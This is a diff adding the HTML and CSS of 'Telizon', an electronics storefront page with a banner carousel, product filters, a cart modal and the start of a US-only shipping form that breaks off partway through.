@@ -1,0 +1,2241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telizon - Premium Mobile, Laptop & Gadget Store</title>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --text-light: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+            --accent-green: #22c55e;
+            --crypto-bg: #0f172a;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            padding-bottom: 60px;
+        }
+
+        /* Header & Nav */
+        header {
+            background-color: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--text-light);
+            text-decoration: none;
+            letter-spacing: 1px;
+        }
+
+        .logo span {
+            color: var(--primary);
+        }
+
+        .cart-icon-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            color: var(--text-light);
+            padding: 0.6rem 1.2rem;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+
+        .cart-icon-btn:hover {
+            border-color: var(--primary);
+        }
+
+        .cart-count {
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            padding: 2px 8px;
+            font-size: 0.8rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 4rem 1rem 2rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            color: var(--text-muted);
+            font-size: 1.1rem;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+	/* Image Banner Slider */
+.banner-carousel {
+    position: relative;
+    border-radius: 12px;
+    overflow: hidden;
+    margin-bottom: 2.5rem;
+    box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+    border: 1px solid var(--border);
+}
+
+/* Perfect Dead-Center Positioning for Cart & Checkout Modals */
+#cartModal,
+#checkoutModal {
+    display: none; /* Controlled by JS */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.65); /* Dimmed backdrop */
+    z-index: 9999;
+    
+    /* Flexbox properties to center content vertically and horizontally */
+    align-items: center;
+    justify-content: center;
+}
+
+/* When JS adds .active or sets display: flex */
+#cartModal.active,
+#checkoutModal.active {
+    display: flex !important;
+}
+
+/* Ensure the modal content box stays neatly centered */
+#cartModal .modal-content,
+#checkoutModal .modal-content {
+    margin: auto;
+    width: 90%;
+    max-width: 500px;
+    max-height: 85vh;
+    overflow-y: auto;
+    border-radius: 12px;
+    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
+}
+
+.carousel-slides {
+    display: flex;
+    transition: transform 0.5s ease-in-out;
+    width: 100%;
+}
+
+.slide {
+    min-width: 100%;
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.slide-link {
+    display: block;
+    width: 100%;
+    height: 100%;
+    text-decoration: none;
+}
+
+.banner-img {
+    width: 100%;
+    height: 280px;
+    object-fit: cover;
+    display: block;
+}
+
+.carousel-prev, .carousel-next {
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    background: rgba(15, 23, 42, 0.7);
+    color: #fff;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    width: 40px;
+    height: 40px;
+    cursor: pointer;
+    border-radius: 50%;
+    font-size: 1.2rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.2s;
+    z-index: 10;
+}
+
+.carousel-prev:hover, .carousel-next:hover {
+    background: rgba(15, 23, 42, 0.95);
+}
+
+.carousel-prev { left: 1rem; }
+.carousel-next { right: 1rem; }
+
+.carousel-dots {
+    position: absolute;
+    bottom: 12px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    gap: 8px;
+    z-index: 10;
+}
+
+.dot {
+    width: 10px;
+    height: 10px;
+    background: rgba(255, 255, 255, 0.4);
+    border-radius: 50%;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+
+.dot.active {
+    background: #ffffff;
+    width: 24px;
+    border-radius: 10px;
+}
+
+        /* Filter Tabs */
+        .filters {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            color: var(--text-muted);
+            padding: 0.5rem 1.2rem;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .filter-btn.active, .filter-btn:hover {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+
+        .product-modal-content {
+    max-width: 700px !important;
+    padding: 2rem !important;
+}
+
+.product-modal-grid {
+    display: grid;
+    grid-template-columns: 1fr 1.2fr;
+    gap: 1.5rem;
+    align-items: center;
+}
+
+.product-modal-image img {
+    width: 100%;
+    border-radius: 10px;
+    background: var(--bg-dark);
+    padding: 1rem;
+    border: 1px solid var(--border);
+    object-fit: contain;
+    max-height: 250px;
+}
+
+.product-category-tag {
+    color: var(--primary);
+    font-size: 0.8rem;
+    font-weight: 600;
+    text-transform: uppercase;
+}
+
+.product-modal-info h2 {
+    font-size: 1.4rem;
+    color: var(--text-light);
+    margin: 0.25rem 0 0.5rem 0;
+}
+
+.product-modal-price {
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--accent-green);
+    margin-bottom: 0.75rem;
+}
+
+.product-modal-desc {
+    color: var(--text-muted);
+    font-size: 0.88rem;
+    line-height: 1.5;
+    margin-bottom: 1rem;
+}
+
+.product-specs-list {
+    list-style: none;
+    margin-bottom: 1.25rem;
+    padding: 0;
+}
+
+.product-specs-list li {
+    font-size: 0.85rem;
+    color: var(--text-light);
+    margin-bottom: 0.3rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+}
+
+.product-specs-list li::before {
+    content: "✓";
+    color: var(--accent-green);
+    font-weight: bold;
+}
+
+@media (max-width: 640px) {
+    .product-modal-grid {
+        grid-template-columns: 1fr;
+    }
+}
+
+        /* Products Grid */
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 2rem;
+        }
+
+        .product-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+
+        /* Product Card Styling */
+.product-card {
+    background: #1e293b;
+    border: 1px solid var(--border, #334155);
+    position: relative !important; 
+    border-radius: 12px;
+    padding: 1.25rem;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    transition: transform 0.2s ease, border-color 0.2s ease;
+}
+
+.product-card:hover {
+    transform: translateY(-4px);
+    border-color: var(--primary, #3b82f6);
+}
+
+.product-card img {
+    width: 100%;
+    height: 180px;
+    object-fit: contain;
+    border-radius: 8px;
+    margin-bottom: 0.75rem;
+}
+
+.product-category {
+    font-size: 0.75rem;
+    color: var(--primary, #3b82f6);
+    text-transform: uppercase;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+}
+
+.product-card h3 {
+    font-size: 1.1rem;
+    color: #f8fafc;
+    margin: 0.25rem 0 0.5rem 0;
+}
+
+.product-card .price {
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: #10b981; /* Accent green */
+    margin-bottom: 1rem;
+}
+
+/* Styled Add to Cart Button */
+.product-card button {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    background: #3b82f6; /* Modern accent blue */
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    font-size: 0.9rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.2s ease, transform 0.1s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+}
+
+.product-card button:hover {
+    background: #2563eb;
+}
+
+.product-card button:active {
+    transform: scale(0.98);
+}
+
+        .product-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--primary);
+        }
+
+        .product-image {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            background-color: #000;
+        }
+
+        .product-info {
+            padding: 1.2rem;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .product-title {
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .product-price {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+
+        .add-to-cart-btn {
+            margin-top: auto;
+            width: 100%;
+            padding: 0.75rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .add-to-cart-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        /* Modal Base */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 1rem;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 550px;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 2rem;
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1.2rem;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .close-modal:hover {
+            color: var(--text-light);
+        }
+
+        .modal-title {
+            margin-bottom: 1.5rem;
+            font-size: 1.5rem;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+        }
+
+        /* Modal Header & Position Control */
+.modal-content {
+    position: relative; /* Essential for positioning absolute close icon */
+}
+
+/* Modal Close Icon (Top-Right X) */
+.close-btn, 
+.close {
+    position: absolute;
+    top: 1.25rem;
+    right: 1.25rem;
+    width: 32px;
+    height: 32px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 50%;
+    color: #9ca3af;
+    font-size: 1.25rem;
+    font-weight: 600;
+    line-height: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.2s ease-in-out;
+    user-select: none;
+    z-index: 10;
+}
+
+/* Close Icon Hover State */
+.close-btn:hover, 
+.close:hover {
+    background: rgba(239, 68, 68, 0.2); /* Subtle red glow */
+    border-color: rgba(239, 68, 68, 0.4);
+    color: #f87171;
+    transform: rotate(90deg); /* Modern turn animation */
+}
+
+/* Secondary Action Buttons (e.g., "Back to Shipping" / "Cancel") */
+.btn-secondary {
+    background: transparent;
+    color: #9ca3af;
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    padding: 0.75rem 1.25rem;
+    border-radius: 8px;
+    font-size: 0.9rem;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+}
+
+.btn-secondary:hover {
+    background: rgba(255, 255, 255, 0.08);
+    color: #ffffff;
+    border-color: rgba(255, 255, 255, 0.3);
+}
+
+        /* Modal Overlay - Hidden by default */
+.modal {
+    display: none; /* Keeps modal hidden on page load */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.75);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+}
+
+
+
+/* Shown only when .active class is added via JS */
+.modal.active {
+    display: flex;
+}
+
+        /* Cart View */
+        .cart-items {
+            margin-bottom: 1.5rem;
+        }
+
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .cart-summary {
+            display: flex;
+            justify-content: space-between;
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+        }
+
+        /* Checkout View Options */
+        .crypto-box {
+            background: var(--crypto-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.2rem;
+            margin: 1rem 0;
+        }
+
+        .crypto-option {
+            margin-bottom: 1rem;
+        }
+
+        .crypto-option label {
+            display: block;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 0.3rem;
+        }
+
+        .address-container {
+            display: flex;
+            gap: 8px;
+        }
+
+        .address-input {
+            width: 100%;
+            background: #1e293b;
+            border: 1px solid var(--border);
+            color: var(--accent-green);
+            font-family: monospace;
+            padding: 0.5rem;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        .copy-btn {
+            background: var(--border);
+            color: var(--text-light);
+            border: none;
+            padding: 0.5rem 0.8rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary);
+        }
+
+        /* Continue to Payment & Primary Action Buttons */
+#shippingForm button[type="submit"],
+.submit-btn {
+    width: 100%;
+    padding: 0.85rem 1.5rem;
+    margin-top: 1.25rem;
+    background: linear-gradient(135deg, #2563eb, #1d4ed8);
+    color: #ffffff;
+    font-size: 1rem;
+    font-weight: 600;
+    letter-spacing: 0.025em;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    box-shadow: 0 4px 14px rgba(37, 99, 235, 0.35);
+    transition: all 0.2s ease-in-out;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+}
+
+/* Hover & Active States */
+#shippingForm button[type="submit"]:hover,
+.submit-btn:hover {
+    background: linear-gradient(135deg, #1d4ed8, #1e40af);
+    box-shadow: 0 6px 20px rgba(37, 99, 235, 0.5);
+    transform: translateY(-1px);
+}
+
+#shippingForm button[type="submit"]:active,
+.submit-btn:active {
+    transform: translateY(0);
+    box-shadow: 0 2px 8px rgba(37, 99, 235, 0.3);
+}
+
+/* Disabled/Processing State */
+#shippingForm button[type="submit"]:disabled,
+.submit-btn:disabled {
+    background: #374151;
+    color: #9ca3af;
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: none;
+}
+
+        .social-support {
+            margin-top: 1.5rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .social-support p {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .social-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 0.6rem;
+            border-radius: 6px;
+            text-decoration: none;
+            color: white;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: opacity 0.2s;
+        }
+
+        .social-btn:hover {
+            opacity: 0.9;
+        }
+
+       .telegram { background-color: #0088cc; }
+.instagram { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
+
+        .checkout-btn {
+            width: 100%;
+            padding: 0.8rem;
+            background: var(--accent-green);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .checkout-btn:hover {
+            opacity: 0.9;
+        }
+
+        .empty-cart-msg {
+            text-align: center;
+            color: var(--text-muted);
+            padding: 2rem 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+    .product-grid {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr); /* Forces 2 equal columns side-by-side */
+        gap: 0.5rem;                           /* Sets clean spacing between cards */
+        width: 100%;
+        box-sizing: border-box;
+    }
+
+    .product-card {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        box-sizing: border-box;
+    }
+
+    .product-image {
+        width: 100%;
+        height: 140px;                         /* Uniform height for 2-column mobile layout */
+        object-fit: contain;
+        background-color: #ffffff !important;   /* Solid white background */
+        padding: 6px;
+        box-sizing: border-box;
+    }
+
+    .product-title {
+        font-size: 0.8rem;
+        line-height: 1.2;
+        height: 2.4em;                         /* Keeps card heights aligned across both columns */
+        overflow: hidden;
+        margin-bottom: 0.25rem;
+    }
+
+    .product-price {
+        font-size: 0.95rem;
+        margin-bottom: 0.4rem;
+    }
+
+    .add-to-cart-btn {
+        padding: 0.45rem 0.2rem;
+        font-size: 0.75rem;
+    }
+}
+
+/* Checkout Form Styles */
+.form-group {
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 0.8rem;
+    text-align: left;
+}
+
+.form-group label {
+    font-size: 0.75rem;
+    color: var(--text-muted, #94a3b8);
+    margin-bottom: 0.25rem;
+    font-weight: 600;
+}
+
+.form-group input, 
+.form-group select {
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid var(--border, #334155);
+    color: #fff;
+    padding: 0.6rem;
+    border-radius: 6px;
+    font-size: 0.85rem;
+    outline: none;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.form-group input:focus, 
+.form-group select:focus {
+    border-color: var(--primary, #3b82f6);
+}
+
+.form-group select option {
+    background: #1e293b;
+    color: #fff;
+}
+
+/* 3-Column Layout for City, State, ZIP on Desktop */
+.form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 0.5rem;
+}
+
+/* Always Visible Discount Badge */
+.discount-badge {
+    display: inline-block !important;
+    visibility: visible !important;
+    opacity: 1 !important;
+    position: absolute;
+    top: 12px;
+    left: 12px;
+    background: #ef4444; /* Bright Red */
+    color: #ffffff;
+    font-size: 0.75rem;
+    font-weight: 800;
+    letter-spacing: 0.05em;
+    padding: 4px 10px;
+    border-radius: 6px;
+    text-transform: uppercase;
+    z-index: 2;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.25);
+    pointer-events: none; /* Prevents badge from interfering with card clicks */
+}
+
+
+
+/* Mobile Responsiveness for Form Fields */
+@media (max-width: 600px) {
+    .form-row {
+        grid-template-columns: 1fr; /* Stacks City, State, and ZIP vertically on mobile */
+    }
+}
+/* FORCE MODAL TO CENTER OF SCREEN */
+/* Modal overlay styling */
+#productDetailModal {
+    display: none; /* Keep hidden by default */
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    width: 100vw !important;
+    height: 100vh !important;
+    background-color: rgba(0, 0, 0, 0.8) !important;
+    z-index: 99999 !important;
+
+    /* Center positioning when active */
+    align-items: center !important;
+    justify-content: center !important;
+}
+
+/* Force flex display ONLY when active class is added */
+#productDetailModal.active {
+    display: flex !important;
+}
+
+/* Inner content box */
+#productDetailModal .modal-content,
+#productDetailModal .product-modal-content {
+    margin: auto !important;
+    position: relative !important;
+    max-width: 600px !important;
+    width: 90% !important;
+    background: #1e293b !important;
+    border-radius: 12px !important;
+    padding: 2rem !important;
+    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5) !important;
+}
+
+/* Ensure the inner box doesn't stretch weirdly */
+#productDetailModal .modal-content {
+    margin: auto !important;
+    position: relative !important;
+}
+
+/* Lock the dark overlay across the entire screen */
+#productDetailModal {
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    width: 100vw !important;
+    height: 100vh !important;
+    background-color: rgba(0, 0, 0, 0.8) !important;
+    z-index: 99999 !important;
+
+    /* These 3 lines move the popup box to the exact middle */
+    display: flex;
+    align-items: center !important;
+    justify-content: center !important;
+}
+
+/* Ensure the white/dark content box doesn't stretch or push left */
+#productDetailModal > div,
+#productDetailModal .modal-content,
+#productDetailModal .product-modal-content {
+    margin: auto !important;
+    position: relative !important;
+    max-width: 600px !important;
+    width: 90% !important;
+    background: #1e293b !important; /* Matches your dark theme */
+    border-radius: 12px !important;
+    padding: 2rem !important;
+    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5) !important;
+}
+
+/* Page Background & Global Text Color */
+body {
+    background-color: #ffffff !important;
+    color: #0f172a !important; /* Dark text for readability on white background */
+}
+
+/* Product Card Styling for White Background */
+.product-card {
+    background-color: #f8fafc !important; /* Light gray card body */
+    border: 1px solid #e2e8f0 !important;
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05) !important;
+}
+
+/* Card Titles & Categories */
+.product-card h3 {
+    color: #0f172a !important;
+}
+
+.product-category {
+    color: #64748b !important;
+}
+
+/* Image Frame on White Page */
+.product-card img,
+#productGrid .product-card img {
+    background: #ffffff !important;
+    border: 1px solid #e2e8f0 !important;
+    box-shadow: none !important;
+}
+
+/* Modal Styling for Light Theme */
+#productDetailModal .modal-content,
+#productDetailModal .product-modal-content {
+    background: #ffffff !important;
+    color: #0f172a !important;
+    border: 1px solid #e2e8f0 !important;
+}
+
+#modalProductTitle {
+    color: #0f172a !important;
+}
+
+#modalProductDesc, 
+#modalProductSpecs li {
+    color: #475569 !important;
+}
+/* Responsive Banner Carousel Styles */
+.banner-carousel {
+    position: relative;
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto 20px auto;
+    overflow: hidden;
+    border-radius: 12px;
+}
+
+.carousel-slides {
+    display: flex;
+    transition: transform 0.5s ease-in-out;
+    width: 100%;
+}
+
+.slide {
+    min-width: 100%;
+    box-sizing: border-box;
+}
+
+/* Base Mobile Height */
+.slide img, 
+.banner-img {
+    width: 100%;
+    height: 180px;
+    object-fit: cover;
+    display: block;
+    border-radius: 12px;
+}
+
+/* Tablet Screens (600px and up) */
+@media (min-width: 600px) {
+    .slide img, 
+    .banner-img {
+        height: 280px;
+    }
+}
+
+/* PC / Desktop Screens (1024px and up) */
+@media (min-width: 1024px) {
+    .slide img, 
+    .banner-img {
+        height: 380px;
+    }
+}
+/* White Theme for Cart and Form Modals */
+#cartModal .modal-content,
+#checkoutModal .modal-content {
+    background-color: #ffffff !important;
+    color: #0f172a !important;
+    border: 1px solid #e2e8f0;
+    box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+}
+
+/* Modal Headers & Close Buttons */
+#cartModal h2, 
+#checkoutModal h2, 
+#checkoutModal h3,
+#cartModal .close-btn, 
+#checkoutModal .close-btn {
+    color: #0f172a !important;
+}
+
+/* Form Inputs inside Checkout */
+#shippingForm input, 
+#shippingForm select, 
+#shippingForm textarea {
+    background-color: #f8fafc !important;
+    color: #0f172a !important;
+    border: 1px solid #cbd5e1 !important;
+}
+
+#shippingForm input::placeholder {
+    color: #94a3b8 !important;
+}
+
+#shippingForm label {
+    color: #334155 !important;
+    font-weight: 600;
+}
+
+/* Cart Items Text & Dividers */
+.cart-item {
+    border-bottom: 1px solid #e2e8f0 !important;
+}
+
+.empty-cart-msg {
+    color: #64748b !important;
+}
+
+    </style>
+</head>
+<body>
+
+    <!-- TOP SHIPPING LOCATION BANNER -->
+<div id="locationBar" style="background-color: #1e293b; color: #93c5fd; text-align: center; padding: 10px; font-size: 0.9rem; border-bottom: 1px solid #334155; display: flex; align-items: center; justify-content: center; gap: 8px;">
+    <span></span>
+    <span id="userLocationNotice">Checking shipping availability...</span>
+</div>
+
+   <header>
+    <div class="nav-container" style="display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 12px 16px; background-color: #0f172a;">
+        <a href="#" class="logo" style="font-weight: bold; font-size: 1.2rem; color: #ffffff; text-decoration: none;">TELIZON<span style="color: #38bdf8;">.</span></a>
+        
+        <!-- TOP SEARCH BAR NEXT TO CART -->
+        <div style="flex: 1; max-width: 280px; margin: 0 5px;">
+            <input 
+                type="text" 
+                id="searchInput" 
+                placeholder="🔍 Search..." 
+                oninput="handleSearch()" 
+                style="width: 100%; padding: 8px 12px; font-size: 0.85rem; border: 1px solid #334155; border-radius: 20px; background: #1e293b; color: #ffffff; outline: none;"
+            >
+        </div>
+
+        <button class="cart-icon-btn" onclick="toggleModal('cartModal')" style="white-space: nowrap; padding: 8px 12px; background: #2563eb; color: #fff; border: none; border-radius: 8px; cursor: pointer;">
+            Cart 🛒 <span class="cart-count" id="cartCount" style="background: #4444; color: #fff; padding: 2px 6px; border-radius: 50%; font-size: 0.75rem;">0</span>
+        </button>
+    </div>
+</header>
+
+    <section class="hero">
+        <h1>Next-Gen Tech Essentials</h1>
+        <p>Explore high-performance laptops, flagship smartphones, luxury tvs and modern daily gadgets.</p>
+    </section>
+
+    <div class="container">
+	<!-- Banner Slider -->
+<div class="banner-carousel" id="bannerCarousel" onmouseenter="pauseSlideTimer()" onmouseleave="startSlideTimer()">
+    <div class="carousel-slides" id="carouselSlides">
+        <!-- Slide 1 -->
+        <div class="slide">
+            <a href="#" class="slide-link">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnCx6P2ShxY_YD4ooD60mS3B-LQXc_e4qgRrA6mQJ4Fyz8L7VL-2Xtqj4&s=10">
+            </a>
+        </div>
+        <!-- Slide 2 -->
+        <div class="slide">
+            <a href="#" class="slide-link">
+                <img src="YOUR_IMAGE_URL_2" alt="Banner 2" class="banner-img">
+            </a>
+        </div>
+        <!-- Slide 3 -->
+        <div class="slide">
+            <a href="#" class="slide-link">
+                <img src="YOUR_IMAGE_URL_3" alt="Banner 3" class="banner-img">
+            </a>
+        </div>
+    </div>
+    
+    <button class="carousel-prev" onclick="moveSlide(-1)">&#10094;</button>
+    <button class="carousel-next" onclick="moveSlide(1)">&#10095;</button>
+
+    <div class="carousel-dots" id="carouselDots">
+        <span class="dot active" onclick="goToSlide(0)"></span>
+        <span class="dot" onclick="goToSlide(1)"></span>
+        <span class="dot" onclick="goToSlide(2)"></span>
+    </div>
+</div>
+        <div class="filters">
+            <button class="filter-btn active" onclick="filterProducts('all')">All Products</button>
+            <button class="filter-btn" onclick="filterProducts('mobile')">Mobiles</button>
+            <button class="filter-btn" onclick="filterProducts('laptop')">Laptops</button>
+	    <button class="filter-btn" onclick="filterProducts('Cameras')">Cameras</button>
+            <button class="filter-btn" onclick="filterProducts('gadget')">Gadgets</button>
+	    <button class="filter-btn" onclick="filterProducts('TVs')">TVs</button>
+        </div>
+
+       
+
+        <div class="product-grid" id="productGrid">
+            <!-- Dynamic Injection -->
+        </div>
+    </div>
+
+    <!-- Cart Modal -->
+    <div class="modal-overlay" id="cartModal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="toggleModal('cartModal')">&times;</button>
+            <h2 class="modal-title">Your Cart</h2>
+            <div class="cart-items" id="cartItems">
+                <!-- Cart items will render here -->
+            </div>
+            <div class="cart-summary">
+                <span>Total:</span>
+                <span id="cartTotal">$0</span>
+            </div>
+            <button class="checkout-btn" onclick="openCheckout()">Proceed to Checkout</button>
+        </div>
+    </div>
+
+    
+<!-- Checkout Modal -->
+<div id="checkoutModal" class="modal">
+    <div class="modal-content">
+        <button class="close-btn" onclick="closeCheckout()">&times;</button>
+        
+        <!-- STEP 1: USA Shipping Form -->
+        <div id="checkoutStep1">
+            <h2 class="modal-title">Shipping Details</h2>
+            <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1rem;">
+                Deliveries available for United States only.
+            </p>
+            
+            <form id="shippingForm" onsubmit="handleShippingSubmit(event)">
+    <div class="form-group">
+        <label>Full Name</label>
+        <input type="text" id="custName" name="custName" required placeholder="John Doe">
+    </div>
+    
+    <div class="form-group">
+        <label>Email Address</label>
+        <input type="email" id="custEmail" name="custEmail" required placeholder="john@example.com">
+    </div>
+
+    <div class="form-group">
+        <label>Phone Number (US)</label>
+        <input type="tel" id="custPhone" name="custPhone" required placeholder="(555) 000-0000">
+    </div>
+
+    <div class="form-group">
+        <label>Street Address</label>
+        <input type="text" id="custAddress" name="custAddress" required placeholder="123 Main St, Apt 4B">
+    </div>
+
+    <div class="form-row">
+        <div class="form-group">
+            <label>City</label>
+            <input type="text" id="custCity" name="custCity" required placeholder="New York">
+        </div>
+        <div class="form-group">
+            <label>State</label>
+            <select id="custState" name="custState" required>
+                <option value="">Select State</option>
+                <option value="AL">AL</option><option value="AK">AK</option><option value="AZ">AZ</option>
+                <option value="AR">AR</option><option value="CA">CA</option><option value="CO">CO</option>
+                <option value="CT">CT</option><option value="DE">DE</option><option value="FL">FL</option>
+                <option value="GA">GA</option><option value="HI">HI</option><option value="ID">ID</option>
+                <option value="IL">IL</option><option value="IN">IN</option><option value="IA">IA</option>
+                <option value="KS">KS</option><option value="KY">KY</option><option value="LA">LA</option>
+                <option value="ME">ME</option><option value="MD">MD</option><option value="MA">MA</option>
+                <option value="MI">MI</option><option value="MN">MN</option><option value="MS">MS</option>
+                <option value="MO">MO</option><option value="MT">MT</option><option value="NE">NE</option>
+                <option value="NV">NV</option><option value="NH">NH</option><option value="NJ">NJ</option>
+                <option value="NM">NM</option><option value="NY">NY</option><option value="NC">NC</option>
+                <option value="ND">ND</option><option value="OH">OH</option><option value="OK">OK</option>
+                <option value="OR">OR</option><option value="PA">PA</option><option value="RI">RI</option>
+                <option value="SC">SC</option><option value="SD">SD</option><option value="TN">TN</option>
+                <option value="TX">TX</option><option value="UT">UT</option><option value="VT">VT</option>
+                <option value="VA">VA</option><option value="WA">WA</option><option value="WV">WV</option>
